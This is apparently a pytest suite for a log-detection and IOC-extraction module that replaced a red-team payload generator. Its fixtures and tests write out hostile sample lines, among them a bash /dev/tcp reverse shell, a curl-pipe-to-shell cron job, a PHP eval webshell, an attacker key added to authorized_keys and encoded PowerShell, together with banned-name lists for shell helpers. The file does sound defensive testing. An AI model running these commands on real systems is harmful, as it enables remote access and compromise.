"""Detection rule catalogue, IOC extraction and log triage."""

from __future__ import annotations

import pytest
from redteam_toolkit.modules import payload

SUSPICIOUS_LOG = """\
Mar  4 10:11:12 host sshd[99]: Accepted password for root from 203.0.113.44 port 4011 ssh2
Mar  4 10:11:13 web01 apache: GET /shell.php?q=bash -i >& /dev/tcp/198.51.100.7/4444 0>&1
Mar  4 10:11:14 web01 apache: POST /upload.php user=<?php eval($_POST["cmd"]); ?> host=portal
Mar  4 10:11:15 host CRON[123]: (root) CMD (curl http://198.51.100.7/x.sh | sh)
Mar  4 10:11:16 host useradd: adding new user svc-backup with admin group
Mar  4 10:11:17 host user: history -c
Mar  4 10:11:18 host user: cat /etc/passwd; whoami; uname -a; id; netstat -tulnp
Mar  4 10:11:19 host user: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA
Mar  4 10:11:20 host sshd: Authorized key added for attacker abc@evil.tld to /home/deploy/.ssh/authorized_keys
sha256 = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
md5    = 5d41402abc4b2a76b9719d911017c592
"""

BENIGN_LOG = """\
Mar  4 09:00:03 web01 sshd[1201]: Accepted password for alice from 10.0.0.14 port 55222 ssh2
Mar  4 09:00:26 web01 kernel: [1201.334] eth0: Link is Up 10 Gbit/s
Mar  4 09:00:31 web01 cron[900]: (root) CMD (/usr/local/bin/backup.sh)
Mar  4 09:01:00 web01 sshd[1202]: pam_unix(sshd:session): session opened for user deploy
"""


class TestRuleCatalogue:
    def test_rules_are_well_formed(self):
        assert len(payload.RULES) >= 10
        for rule in payload.RULES:
            assert rule.rule_id.startswith("RTT-")
            assert rule.name
            assert rule.severity in ("info", "low", "medium", "high", "critical")
            assert rule.attack.startswith("TA")
            assert rule.technique
            assert rule.why
            assert rule.hunt

    def test_rule_ids_are_unique(self):
        ids = [rule.rule_id for rule in payload.RULES]
        assert len(ids) == len(set(ids))

    def test_every_rule_regex_compiles(self):
        for rule in payload.RULES:
            assert rule.compiled() is not None

    def test_rules_index_matches_the_tuple(self):
        assert set(payload.RULES_BY_ID) == {rule.rule_id for rule in payload.RULES}

    def test_catalogue_report_lists_every_rule(self):
        report = payload.build_rules_report()
        assert report.data["rule_count"] == len(payload.RULES)
        assert len(report.data["rules"]) == len(payload.RULES)
        assert "detection" in report.data["reframed_from"].lower()


class TestMatching:
    def test_reverse_shell_is_detected(self):
        matches = payload.match_line("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1")
        assert any(m.rule.rule_id == "RTT-001" for m in matches)

    def test_webshell_is_detected(self):
        matches = payload.match_line('GET /x.php?a=eval($_POST["cmd"])')
        assert any(m.rule.rule_id == "RTT-002" for m in matches)

    def test_log_clearing_is_detected(self):
        matches = payload.match_line("user@host: history -c")
        assert any(m.rule.rule_id == "RTT-011" for m in matches)

    def test_authorized_keys_write_is_detected(self):
        matches = payload.match_line("key added to /home/deploy/.ssh/authorized_keys")
        assert any(m.rule.rule_id == "RTT-004" for m in matches)

    def test_encoded_powershell_is_detected(self):
        matches = payload.match_line("powershell.exe -enc SQBFAFgA")
        assert any(m.rule.rule_id == "RTT-006" for m in matches)

    def test_download_to_shell_is_detected(self):
        matches = payload.match_line("curl http://x/y.sh | sh")
        assert any(m.rule.rule_id == "RTT-010" for m in matches)

    def test_new_admin_account_is_detected(self):
        matches = payload.match_line("useradd: adding new user svc with admin group")
        assert any(m.rule.rule_id == "RTT-007" for m in matches)

    def test_benign_lines_do_not_match(self):
        assert payload.match_line("eth0: Link is Up 10 Gbit/s") == []
        assert payload.match_line("Accepted password for alice from 10.0.0.14 port 55222 ssh2") == []

    def test_benign_log_produces_no_matches(self):
        assert payload.match_text(BENIGN_LOG) == []

    def test_line_numbers_are_recorded(self):
        matches = payload.match_text(SUSPICIOUS_LOG)
        assert matches
        assert all(m.line_no > 0 for m in matches)

    def test_match_count_is_capped(self):
        noisy = "\n".join("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" for _ in range(500))
        assert len(payload.match_text(noisy, max_matches=50)) <= 50


class TestIocExtraction:
    def test_public_ipv4_is_extracted(self):
        iocs = payload.extract_iocs("attack from 45.83.12.9 and 104.21.7.88")
        assert set(iocs["ipv4"]) == {"45.83.12.9", "104.21.7.88"}

    @pytest.mark.parametrize(
        "address,reason",
        [
            ("10.0.0.1", "RFC1918"),
            ("192.168.1.1", "RFC1918"),
            ("172.16.5.5", "RFC1918"),
            ("127.0.0.1", "loopback"),
            ("169.254.169.254", "link-local metadata"),
            ("192.0.2.5", "TEST-NET documentation range"),
            ("198.51.100.7", "TEST-NET documentation range"),
            ("203.0.113.9", "TEST-NET documentation range"),
        ],
    )
    def test_unblockable_ranges_are_excluded(self, address: str, reason: str):
        """A blocklist full of internal and reserved addresses blocks the wrong things."""
        iocs = payload.extract_iocs(f"traffic from {address} on port 443")
        assert "ipv4" not in iocs or address not in iocs["ipv4"], reason

    def test_hashes_are_extracted(self):
        iocs = payload.extract_iocs(SUSPICIOUS_LOG)
        assert "5d41402abc4b2a76b9719d911017c592" in iocs["md5"]
        assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" in iocs["sha256"]

    def test_urls_and_domains_are_extracted(self):
        iocs = payload.extract_iocs("visit http://45.83.12.9/x.sh on evil.top now")
        assert "http://45.83.12.9/x.sh" in iocs["url"]
        assert "evil.top" in iocs["domain"]

    def test_unix_paths_are_extracted(self):
        iocs = payload.extract_iocs("reading /etc/passwd and /home/deploy/.ssh/authorized_keys")
        assert "/etc/passwd" in iocs["unix_path"]

    def test_trailing_punctuation_is_trimmed(self):
        iocs = payload.extract_iocs("go to http://45.83.12.9/path, then stop.")
        assert "http://45.83.12.9/path" in iocs["url"]

    def test_duplicates_are_collapsed(self):
        iocs = payload.extract_iocs("1.2.3.4 and 1.2.3.4 and 1.2.3.4")
        assert iocs["ipv4"].count("1.2.3.4") == 1

    def test_empty_text_yields_nothing(self):
        assert payload.extract_iocs("") == {}


class TestReport:
    def test_suspicious_log_produces_findings(self):
        report = payload.detect(SUSPICIOUS_LOG, "test.log")
        assert report.at_or_above("critical")
        rules_hit = set(report.data["rules_hit"])
        assert {"RTT-001", "RTT-002", "RTT-011"} <= rules_hit

    def test_each_rule_produces_at_most_one_finding(self):
        """Noisy logs would otherwise emit the same finding hundreds of times."""
        report = payload.detect("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n" * 50)
        checks = [f.check for f in report.findings]
        assert len(checks) == len(set(checks))

    def test_occurrences_are_counted(self):
        report = payload.detect("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n" * 5)
        finding = next(f for f in report.findings if f.check == "detect.rtt-001")
        assert finding.evidence["occurrences"] == 5

    def test_clean_log_is_reported_as_clean_not_silent(self):
        report = payload.detect(BENIGN_LOG, "clean.log")
        assert any(f.check == "detect.clean" for f in report.findings)
        assert not report.at_or_above("low")

    def test_clean_result_states_its_limits(self):
        """No match is not proof of absence, and the report has to say so."""
        report = payload.detect(BENIGN_LOG, "clean.log")
        finding = next(f for f in report.findings if f.check == "detect.clean")
        assert "not evidence of absence" in finding.detail

    def test_iocs_become_a_blocking_finding(self):
        report = payload.detect(SUSPICIOUS_LOG, "test.log")
        assert any(f.check == "detect.iocs" for f in report.findings)

    def test_ioc_finding_cautions_against_raw_blocking(self):
        report = payload.detect(SUSPICIOUS_LOG, "test.log")
        finding = next(f for f in report.findings if f.check == "detect.iocs")
        assert "false positive" in finding.remediation.lower()

    def test_report_serialises(self):
        import json

        json.loads(payload.detect(SUSPICIOUS_LOG, "test.log").to_json())


class TestCustomRules:
    def test_extra_rules_are_loaded(self, tmp_path):
        path = tmp_path / "rules.tsv"
        path.write_text("CUSTOM-1|Internal marker|high|internal-marker\n", encoding="utf-8")
        rules = payload.parse_extra_rules(str(path))
        assert len(rules) == 1
        assert rules[0].rule_id == "CUSTOM-1"
        assert rules[0].severity == "high"

    def test_comments_and_blank_lines_are_skipped(self, tmp_path):
        path = tmp_path / "rules.tsv"
        path.write_text("# a comment\n\nCUSTOM-1|X|low|abc\n", encoding="utf-8")
        assert len(payload.parse_extra_rules(str(path))) == 1

    def test_malformed_lines_are_skipped_not_fatal(self, tmp_path):
        path = tmp_path / "rules.tsv"
        path.write_text("not enough fields\nCUSTOM-1|X|low|abc\n", encoding="utf-8")
        assert len(payload.parse_extra_rules(str(path))) == 1

    def test_invalid_regex_is_rejected_with_a_location(self, tmp_path):
        path = tmp_path / "rules.tsv"
        path.write_text("CUSTOM-1|X|low|([unclosed\n", encoding="utf-8")
        with pytest.raises(ValueError, match="invalid regex"):
            payload.parse_extra_rules(str(path))

    def test_custom_rule_matches_through_the_report(self, tmp_path):
        path = tmp_path / "rules.tsv"
        path.write_text("CUSTOM-1|Internal marker|high|internal-marker\n", encoding="utf-8")
        rules = payload.parse_extra_rules(str(path))
        report = payload.detect("found internal-marker here\n", "x.log", extra_rules=rules)
        assert any(f.check == "detect.custom-1" for f in report.findings)

    def test_unknown_severity_falls_back_to_medium(self, tmp_path):
        path = tmp_path / "rules.tsv"
        path.write_text("CUSTOM-1|X|catastrophic|abc\n", encoding="utf-8")
        assert payload.parse_extra_rules(str(path))[0].severity == "medium"


class TestReframing:
    """The module replaced a payload generator; assert the replacement is real."""

    def test_no_shell_spawning_helpers_exist(self):
        forbidden = {"spawn_shell", "start_listener", "reverse_shell", "generate_payload", "bind_shell"}
        assert not forbidden & set(dir(payload))

    def test_no_process_execution_surface(self):
        """The module must not be able to execute anything, only describe it.

        Checked on the imported module rather than the source text, because the
        rule patterns legitimately *name* dangerous functions in order to detect
        them, which a substring scan would wrongly flag.
        """
        import inspect

        source = inspect.getsource(payload)
        for banned in ("import subprocess", "import socket", "os.system", "os.popen", "spawn", "Popen"):
            assert banned not in source, banned
        assert not hasattr(payload, "subprocess")
        assert not hasattr(payload, "socket")
